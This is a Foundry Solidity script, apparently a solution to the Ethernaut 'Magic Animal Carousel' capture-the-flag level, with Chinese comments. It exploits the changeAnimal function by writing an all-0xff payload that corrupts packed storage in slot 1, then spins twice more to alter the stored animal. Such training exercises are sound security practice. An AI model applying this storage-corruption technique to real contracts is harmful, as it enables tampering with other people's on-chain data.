// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IMagicAnimalCarousel {
    function setAnimalAndSpin(string calldata animal) external;
    function changeAnimal(string calldata animal, uint256 crateId) external;
    function carousel(uint256 crateId) external view returns (uint256);
    function currentCrateId() external view returns (uint256);
}


import "forge-std/Script.sol";

contract SolveCarousel is Script {
    // 填入你的 Ethernaut Instance 地址
    address levelAddress = vm.envAddress("INSTANCE_ADDRESS");
    IMagicAnimalCarousel carousel = IMagicAnimalCarousel(levelAddress);

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        // 1. 放入第一隻動物 "WZM"，currentCrateId 會從 0 變成 1
        console.log("Current ID before start:", carousel.currentCrateId());
        carousel.setAnimalAndSpin("WZM");
        uint256 currentID = carousel.currentCrateId();
        console.log("Current ID after first spin:", currentID); // 應該是 1
        
        // 記錄原始的動物數據
        uint256 originalAnimal = carousel.carousel(1);
        console.log("Original animal in slot 1:", originalAnimal);
        console.logBytes(abi.encodePacked("WZM")); // 打印原始動物名

        // 2. 構造攻擊字串 (12 bytes) - 全部設為 0xff
        // 這會污染 carousel[1] 的所有數據，包括動物名和 nextId
        bytes memory payloadBytes = new bytes(12);
        for(uint i = 0; i < 12; i++) {
            payloadBytes[i] = bytes1(0xff);
        }
        string memory payload = string(payloadBytes);

        // 3. 利用 changeAnimal 的漏洞，用全 0xff 污染 carousel[1]
        carousel.changeAnimal(payload, currentID);
        console.log("Polluted carousel[1] with 0xff");

        // 4. 添加第二個動物 "AAA"，從 ID 1 跳到 65535
        carousel.setAnimalAndSpin("AAA");
        console.log("Current ID after AAA:", carousel.currentCrateId()); // 應該是 65535

        // 5. 添加第三個動物 "BBB"，觸發最終的數據污染
        // 從 65535 跳回 0 或 1，並且因為名字不滿10字節
        // 會保留第2步中污染的 0xff 數據
        carousel.setAnimalAndSpin("BBB");
        console.log("Attack complete! Current ID:", carousel.currentCrateId());
        
        // 檢查 slot 1 的動物是否被改變（這是題目要求）
        uint256 modifiedAnimal = carousel.carousel(1);
        console.log("Slot 1 value after attack:", modifiedAnimal);
        console.log("Original vs Modified:");
        console.log("  Original:", originalAnimal);
        console.log("  Modified:", modifiedAnimal);
        console.log("Animal changed?", originalAnimal != modifiedAnimal);

        vm.stopBroadcast();
    }
}
